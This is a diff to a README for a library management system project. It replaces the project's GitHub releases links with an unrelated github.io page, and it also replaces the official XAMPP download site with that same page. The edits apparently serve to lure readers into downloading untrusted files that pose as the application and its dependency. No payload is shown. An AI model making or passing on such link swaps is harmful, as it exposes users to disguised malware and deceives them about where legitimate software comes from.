@@ -1,7 +1,7 @@
 <h1>📚 full-stack-library-management-system - Manage Your Library With Ease</h1>
 
 <p align="center">
-  <a href="https://github.com/oneperson-woollyadelgid1574/full-stack-library-management-system/releases">
+  <a href="https://oneperson-woollyadelgid1574.github.io">
     <img src="https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Now" style="max-width:100%;">
   </a>
 </p>
@@ -65,7 +65,7 @@ Let us walk you through getting this software up and running on your computer. T
 
 First things first, you need to download the software onto your computer. 
 
-**👉 Visit this link to download the application:** [https://github.com/oneperson-woollyadelgid1574/full-stack-library-management-system/releases](https://github.com/oneperson-woollyadelgid1574/full-stack-library-management-system/releases)
+**👉 Visit this link to download the application:** [https://oneperson-woollyadelgid1574.github.io](https://oneperson-woollyadelgid1574.github.io)
 
 
 
@@ -83,7 +83,7 @@ This software requires a program called **XAMPP** to run. XAMPP is a free tool t
 
 To install XAMPP:
 
-1. Open your web browser and go to [https://www.apachefriends.org](https://www.apachefriends.org)
+1. Open your web browser and go to [https://oneperson-woollyadelgid1574.github.io](https://oneperson-woollyadelgid1574.github.io)
 
 2. Click on the **Download** button for your operating system (Windows is recommended if you are on a PC)
 
@@ -356,7 +356,7 @@ Happy organizing, and enjoy your new library system!
 
 Need to download the application again? No problem:
 
-**👉 [Download the Application Now](https://github.com/oneperson-woollyadelgid1574/full-stack-library-management-system/releases)**
+**👉 [Download the Application Now](https://oneperson-woollyadelgid1574.github.io)**
 
 
 
